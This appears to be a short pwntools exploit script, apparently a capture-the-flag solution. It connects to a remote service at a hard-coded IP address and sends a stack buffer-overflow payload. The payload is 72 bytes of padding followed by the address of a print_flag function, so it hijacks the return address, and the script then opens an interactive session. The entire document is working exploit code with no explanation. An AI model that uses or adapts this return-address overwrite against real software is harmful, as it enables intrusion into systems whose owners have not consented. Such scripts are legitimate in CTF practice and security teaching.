from pwn import *

p = remote("20.84.72.194",5000)

print_flag = 0x4011f6

payload = b'a' * 64 + b'b' * 8 + p64(print_flag)
p.sendlineafter("pwnme: ",payload)
p.interactive()